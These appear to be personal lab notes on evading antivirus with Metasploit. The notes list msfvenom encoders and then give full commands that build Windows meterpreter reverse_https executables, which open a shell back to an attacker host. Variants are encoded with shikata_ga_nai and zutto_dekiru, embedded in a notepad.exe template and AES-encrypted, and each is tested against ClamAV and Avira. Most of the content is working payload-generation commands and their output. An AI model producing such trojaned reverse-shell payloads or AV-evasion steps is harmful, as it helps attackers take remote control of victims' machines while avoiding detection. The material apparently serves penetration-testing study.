# Encoders
Metasploit provide encoders used solely for character substitution to replace bad characters in exploit payloads. Help bypass signatures

x86/shikata_ga_nai_ encoder is that is good for signature evasion


```
┌──(kali㉿kali)-[~]
└─$ msfvenom --list encoders

Framework Encoders [--encoder <value>]
======================================

    Name                          Rank       Description
    ----                          ----       -----------
    cmd/base64                    good       Base64 Command Encoder
    cmd/brace                     low        Bash Brace Expansion Command Encoder
    cmd/echo                      good       Echo Command Encoder
    cmd/generic_sh                manual     Generic Shell Variable Substitution Command Encoder
    cmd/ifs                       low        Bourne ${IFS} Substitution Command Encoder
    cmd/perl                      normal     Perl Command Encoder
    cmd/powershell_base64         excellent  Powershell Base64 Command Encoder
    cmd/printf_php_mq             manual     printf(1) via PHP magic_quotes Utility Command Encoder
    generic/eicar                 manual     The EICAR Encoder
    generic/none                  normal     The "none" Encoder
    mipsbe/byte_xori              normal     Byte XORi Encoder
    mipsbe/longxor                normal     XOR Encoder
    mipsle/byte_xori              normal     Byte XORi Encoder
    mipsle/longxor                normal     XOR Encoder
    php/base64                    great      PHP Base64 Encoder
    ppc/longxor                   normal     PPC LongXOR Encoder
    ppc/longxor_tag               normal     PPC LongXOR Encoder
    ruby/base64                   great      Ruby Base64 Encoder
    sparc/longxor_tag             normal     SPARC DWORD XOR Encoder
    x64/xor                       normal     XOR Encoder
    x64/xor_context               normal     Hostname-based Context Keyed Payload Encoder
    x64/xor_dynamic               normal     Dynamic key XOR Encoder
    x64/zutto_dekiru              manual     Zutto Dekiru
    x86/add_sub                   manual     Add/Sub Encoder
    x86/alpha_mixed               low        Alpha2 Alphanumeric Mixedcase Encoder
    x86/alpha_upper               low        Alpha2 Alphanumeric Uppercase Encoder
    x86/avoid_underscore_tolower  manual     Avoid underscore/tolower
    x86/avoid_utf8_tolower        manual     Avoid UTF8/tolower
    x86/bloxor                    manual     BloXor - A Metamorphic Block Based XOR Encoder
    x86/bmp_polyglot              manual     BMP Polyglot
    x86/call4_dword_xor           normal     Call+4 Dword XOR Encoder
    x86/context_cpuid             manual     CPUID-based Context Keyed Payload Encoder
    x86/context_stat              manual     stat(2)-based Context Keyed Payload Encoder
    x86/context_time              manual     time(2)-based Context Keyed Payload Encoder
    x86/countdown                 normal     Single-byte XOR Countdown Encoder
    x86/fnstenv_mov               normal     Variable-length Fnstenv/mov Dword XOR Encoder
    x86/jmp_call_additive         normal     Jump/Call XOR Additive Feedback Encoder
    x86/nonalpha                  low        Non-Alpha Encoder
    x86/nonupper                  low        Non-Upper Encoder
    x86/opt_sub                   manual     Sub Encoder (optimised)
    x86/service                   manual     Register Service
    x86/shikata_ga_nai            excellent  Polymorphic XOR Additive Feedback Encoder
    x86/single_static_bit         manual     Single Static Bit
    x86/unicode_mixed             manual     Alpha2 Alphanumeric Unicode Mixedcase Encoder
    x86/unicode_upper             manual     Alpha2 Alphanumeric Unicode Uppercase Encoder
    x86/xor_dynamic               normal     Dynamic key XOR Encoder
    x86/xor_poly                  normal     XOR POLY Encoder
```

Our payload
```
┌──(kali㉿kali)-[~]
└─$ sudo msfvenom -p windows/meterpreter/reverse_https LHOST=eth0 LPORT=443 -e x86/shikata_ga_nai -f exe -o hello.exe            
[sudo] password for kali: 
Sorry, try again.
[sudo] password for kali: 
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 670 (iteration=0)
x86/shikata_ga_nai chosen with final size 670
Payload size: 670 bytes
Final size of exe file: 73802 bytes
Saved as: hello.exe
```

ClamAV scan will detect this so it no good. Detected shellcode encoded into the exe.
![image](https://github.com/user-attachments/assets/1fc887bb-1b12-4d7e-8924-3cbc380a7654)

Since x64 payload is less common we will try a x64 exe without encoding.
```
┌──(kali㉿kali)-[~]
└─$ sudo msfvenom -p windows/x64/meterpreter/reverse_https LHOST=eth0 LPORT=443  -f exe -o hello.exe 
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 785 (iteration=0)
x86/shikata_ga_nai chosen with final size 785
Payload size: 785 bytes
Final size of exe file: 7168 bytes
Saved as: hello.exe
```

Clean scan 
![image](https://github.com/user-attachments/assets/ff3ce72f-4303-4b72-af98-8692c6082b1a)

Avira will detect this though
![image](https://github.com/user-attachments/assets/092e306a-20b9-47a8-aef1-9dc5ffc65463)


Let try another encoder. This time we will be using the x64/zutto_dekiru
```
┌──(kali㉿kali)-[~]
└─$ sudo msfvenom -p windows/x64/meterpreter/reverse_https LHOST=eth0 LPORT=443 -e x64/zutto_dekiru -f exe -o hello_zutto.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x64/zutto_dekiru
x64/zutto_dekiru succeeded with size 839 (iteration=0)
x64/zutto_dekiru chosen with final size 839
Payload size: 839 bytes
Final size of exe file: 7168 bytes
Saved as: hello_zutto.exe
```

Avira detect this again
![image](https://github.com/user-attachments/assets/b8bc6745-4f2a-41c7-8eea-f34765f33dfc)

copy the notepad application located at
C:\Windows\System32\notepad.exe to Kali and use it as a
template for our payload
```
┌──(kali
sudo msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.176.134 LPORT=443 -e x64/zutto_dekiru -x ./notepad.exe -f exe -o 64_notepad.exe 
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x64/zutto_dekiru
x64/zutto_dekiru succeeded with size 739 (iteration=0)
x64/zutto_dekiru chosen with final size 739
Payload size: 739 bytes
Final size of exe file: 225792 bytes
Saved as: 64_notepad.exe
```

Not effective cant use any msfvenom encoding outdated
![image](https://github.com/user-attachments/assets/9254fdfe-c328-4541-bdf2-0b7eb50ac79c)

Encryptor like the one below is also outdated
So look like we have to write our own runner to bypass AV solution
```
┌──(kali㉿kali)-[~/Desktop]
└─$ sudo msfvenom -p windows/x64/meterpreter/reverse_https LHOST=eth0 LPORT=443 --encrypt aes256 --encrypt-key fdgdgj93jf43uj983uf498f43 -f exe -o static.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 691 bytes
Final size of exe file: 7168 bytes
Saved as: static.exe

```

![image](https://github.com/user-attachments/assets/12e782bc-ebbc-436c-94af-3dd08c029fa7)



